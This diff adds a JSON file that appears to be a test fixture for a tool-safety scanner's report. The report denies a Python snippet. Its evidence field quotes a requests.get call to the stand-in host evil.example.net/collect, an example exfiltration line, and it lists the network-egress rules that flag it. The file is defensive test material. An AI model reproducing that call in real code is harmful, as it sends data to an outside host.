@@ -1,0 +1,49 @@
+{
+  "decision": "deny",
+  "risk_level": "high",
+  "risk_count": 2,
+  "findings": [
+    {
+      "rule_id": "TSG-NETWORK-IMPORT",
+      "risk_type": "network_egress",
+      "risk_level": "low",
+      "message": "Python imports network-capable module requests.",
+      "evidence": "import requests",
+      "recommendation": "Review imported network modules when calls use dynamic or non-allowlisted targets.",
+      "line_no": 1,
+      "column": 0,
+      "redacted": false
+    },
+    {
+      "rule_id": "TSG-NETWORK-NONALLOWLIST",
+      "risk_type": "network_egress",
+      "risk_level": "high",
+      "message": "Network request targets non-allowlisted domain evil.example.net.",
+      "evidence": "requests.get(\"https://evil.example.net/collect\", timeout=5)",
+      "recommendation": "Add the domain to allowed_domains only after review, or block the request.",
+      "line_no": 3,
+      "column": 11,
+      "redacted": false
+    }
+  ],
+  "duration_ms": 1.234,
+  "language": "python",
+  "scanned_at": "2026-07-05T00:00:00+00:00",
+  "tool_name": "tool_safety_check",
+  "cwd": null,
+  "policy_name": "example-tool-safety-policy",
+  "policy_version": "1",
+  "blocked": true,
+  "redacted": false,
+  "summary": "deny due to 2 finding(s); highest risk is high.",
+  "telemetry_attributes": {
+    "tool.safety.decision": "deny",
+    "tool.safety.risk_level": "high",
+    "tool.safety.rule_id": "TSG-NETWORK-IMPORT",
+    "tool.safety.rule_ids": "TSG-NETWORK-IMPORT,TSG-NETWORK-NONALLOWLIST",
+    "tool.safety.finding_count": 2,
+    "tool.safety.redacted": false,
+    "tool.safety.blocked": true,
+    "tool.safety.duration_ms": 1.234
+  }
+}
